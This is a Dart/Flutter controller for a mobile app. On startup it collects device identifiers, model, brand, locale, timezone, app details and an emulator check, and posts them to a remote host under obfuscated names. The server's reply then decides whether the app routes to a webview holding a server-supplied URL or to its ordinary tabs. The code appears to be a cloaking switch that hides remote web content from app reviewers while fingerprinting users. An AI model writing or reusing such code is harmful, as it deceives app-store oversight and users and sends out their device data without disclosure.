import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkReload() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reload");
  }
}

class PageLogic extends GetxController {

  var qedthcrvyo = RxBool(false);
  var tphsimzqnv = RxBool(true);
  var viobsd = RxString("");
  var aileen = RxBool(false);
  var bogisich = RxBool(true);
  final vbqgfh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkReload();
    super.onInit();
    adfj();
  }


  Future<void> adfj() async {

    aileen.value = true;
    bogisich.value = true;
    tphsimzqnv.value = false;

    vbqgfh.post("https://left.episdma.online/aeiurfwkqhxs",data: await nusbki()).then((value) {
      var afvzy = value.data["afvzy"] as String;
      var jgvsezu = value.data["jgvsezu"] as bool;
      if (jgvsezu) {
        viobsd.value = afvzy;
        felton();
      } else {
        kuvalis();
      }
    }).catchError((e) {
      tphsimzqnv.value = true;
      bogisich.value = true;
      aileen.value = false;
    });
  }

  Future<Map<String, dynamic>> nusbki() async {
    final DeviceInfoPlugin qfhx = DeviceInfoPlugin();
    PackageInfo swgon_afodbi = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var axvgfi = Platform.localeName;
    var hkbd_oApqHOJc = currentTimeZone;

    var hkbd_xPeD = swgon_afodbi.packageName;
    var hkbd_Hsn = swgon_afodbi.version;
    var hkbd_kgDSV = swgon_afodbi.buildNumber;

    var hkbd_rP = swgon_afodbi.appName;
    var hkbd_gXBTj = "";
    var hkbd_jbsd  = "";
    var hkbd_JGi = "";
    var mariannaRyan = "";
    var careyRyan = "";
    var ewaldRussel = "";
    var beauMayer = "";


    var hkbd_WmGK = "";
    var hkbd_DE = false;

    if (GetPlatform.isAndroid) {
      hkbd_WmGK = "android";
      var dvtpiumk = await qfhx.androidInfo;

      hkbd_JGi = dvtpiumk.brand;

      hkbd_gXBTj  = dvtpiumk.model;
      hkbd_jbsd = dvtpiumk.id;

      hkbd_DE = dvtpiumk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hkbd_WmGK = "ios";
      var xwvlefsg = await qfhx.iosInfo;
      hkbd_JGi = xwvlefsg.name;
      hkbd_gXBTj = xwvlefsg.model;

      hkbd_jbsd = xwvlefsg.identifierForVendor ?? "";
      hkbd_DE  = xwvlefsg.isPhysicalDevice;
    }
    var res = {
      "hkbd_kgDSV": hkbd_kgDSV,
      "hkbd_WmGK": hkbd_WmGK,
      "hkbd_Hsn": hkbd_Hsn,
      "hkbd_xPeD": hkbd_xPeD,
      "hkbd_gXBTj": hkbd_gXBTj,
      "hkbd_JGi": hkbd_JGi,
      "hkbd_jbsd": hkbd_jbsd,
      "careyRyan" : careyRyan,
      "beauMayer" : beauMayer,
      "hkbd_rP": hkbd_rP,
      "axvgfi": axvgfi,
      "hkbd_DE": hkbd_DE,
      "mariannaRyan" : mariannaRyan,
      "hkbd_oApqHOJc": hkbd_oApqHOJc,
      "ewaldRussel" : ewaldRussel,

    };
    return res;
  }

  Future<void> kuvalis() async {
    Get.offAllNamed("/expectedTab");
  }

  Future<void> felton() async {
    Get.offAllNamed("/expectedCheck");
  }

}
